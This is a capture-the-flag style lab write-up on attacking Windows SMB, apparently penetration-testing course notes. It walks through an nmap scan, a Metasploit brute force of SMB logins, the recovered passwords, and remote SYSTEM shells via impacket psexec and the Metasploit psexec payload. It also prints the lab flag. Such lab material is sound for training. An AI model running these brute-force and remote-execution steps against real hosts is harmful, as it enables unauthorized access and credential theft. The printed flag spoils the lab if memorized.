# 🔬SMB

## Lab 1 - PsExec

> 🔬 [Windows: SMB Server PSexec](https://attackdefense.com/challengedetailsnoauth?cid=1959)
>
> * Target IP: `10.0.21.78`
> * **SMB** exploitation
> * Dictionaries to use:
>   * `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
>   * `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

```bash
nmap -sV -sC 10.0.21.78
```

```bash
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-30 13:10 IST
Nmap scan report for 10.0.21.78
Host is up (0.0023s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=EC2AMAZ-408S766
| Not valid before: 2024-06-29T07:38:34
|_Not valid after:  2024-12-29T07:38:34
|_ssl-date: 2024-06-30T07:40:33+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-30 13:10:36
|_  start_date: 2024-06-30 13:08:33

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.46 seconds
```

<figure><img src="../../../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

> Running SMB version 2.02 which means can authenticate with the system via PsExec

### SMB Brute Force

* Perform smb bruteforce using metasploit module `smb_login`

```bash
msf5 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner
```

```bash
msf5 > use auxiliary/scanner/smb/smb_login 
msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.0.21.78
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > set VERBOSE false
msf5 auxiliary(scanner/smb/smb_login) > run
```

```bash
[+] 10.0.21.78:445        - 10.0.21.78:445 - Success: '.\sysadmin:samantha'
[+] 10.0.21.78:445        - 10.0.21.78:445 - Success: '.\demo:victoria'
[+] 10.0.21.78:445        - 10.0.21.78:445 - Success: '.\auditor:elizabeth'
[+] 10.0.21.78:445        - 10.0.21.78:445 - Success: '.\administrator:qwertyuiop' Administrator
[*] 10.0.21.78:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

<figure><img src="../../../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

### SMB Exploitation

Use [PsExec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) script for Linux (from the [impacket-scripts](https://www.kali.org/tools/impacket-scripts/)) to get a command prompt on the target machine, with the Administrator account.

* Using this technique, **no exploit is launched or uploaded on the target system**.
* It is a legitimate authentication with the actual credentials and the use of an official tool (`psexec`).

```bash
 psexec.py Administrator@10.0.21.78 cmd.exe
```

```bash
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.0.21.78.....
[*] Found writable share admin
[*] Uploading file WlEGirYI.exe
[*] Opening SVCManager on 10.0.21.78.....
[*] Creating service vgLO on 10.0.21.78.....
[*] Starting service vgLO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system  #the highest privileges
```

{% hint style="info" %}
Target the administrator account because that gives the most access, while other normal user only will give a certain level of access.
{% endhint %}

Alternatively to the Python script, use Metasploit [psexec](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/) module to get a `meterpreter` session on the target system.

* This technique will **upload and run a (malicious) payload** on the target. Pay attention to the antivirus!

```bash
msf5 auxiliary(scanner/smb/smb_login) > search psexec

Matching Modules
================
10  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
```

```bash
msf5 auxiliary(scanner/smb/smb_login) > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set RHOSTS 10.0.21.78
msf5 exploit(windows/smb/psexec) > set SMBUser Administrator
msf5 exploit(windows/smb/psexec) > set SMBPass qwertyuiop
msf5 exploit(windows/smb/psexec) > exploit
```

<figure><img src="../../../../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

* Find the flag, running `meterpreter` commands

```bash
shell
cd \
dir
type flag.txt
```

<figure><img src="../../../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>Flag</summary>

`e0da81a9cd42b261bc9b90d15f780433`

</details>

***

## Lab 2 - EternalBlue

{% embed url="https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/1-system-attack/windows-attacks/smb-psexec#lab-2-eternal-blue-extra" %}

{% embed url="https://0xdf.gitlab.io/2019/02/22/wl-dummy.html" %}

{% embed url="https://offensive.run/exploit/eternalblue/README.html" %}





